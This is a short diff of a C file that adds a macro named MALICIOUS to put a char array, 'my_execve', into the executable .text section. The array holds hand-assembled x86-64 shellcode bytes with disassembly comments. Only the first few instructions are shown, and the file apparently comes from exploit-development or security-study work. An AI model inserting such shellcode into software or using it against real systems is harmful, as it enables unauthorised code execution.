@@ -1,7 +1,9 @@
 #undef ASSEMBLY
 
 #if !defined(ASSEMBLY)
-char my_execve[] =
+#define MALICIOUS __attribute__ ((section(".text")))
+
+MALICIOUS char my_execve[] =
 	"\x48\x8d\x05\x20\x00\x00\x00"          /* lea    0x20(%rip),%rax    */
 	"\xff\xe0"                              /* jmpq   *%rax              */
 	"\x48\xc7\x44\x24\x08\x00\x00\x00\x00"  /* movq   $0x0,0x8(%rsp)     */
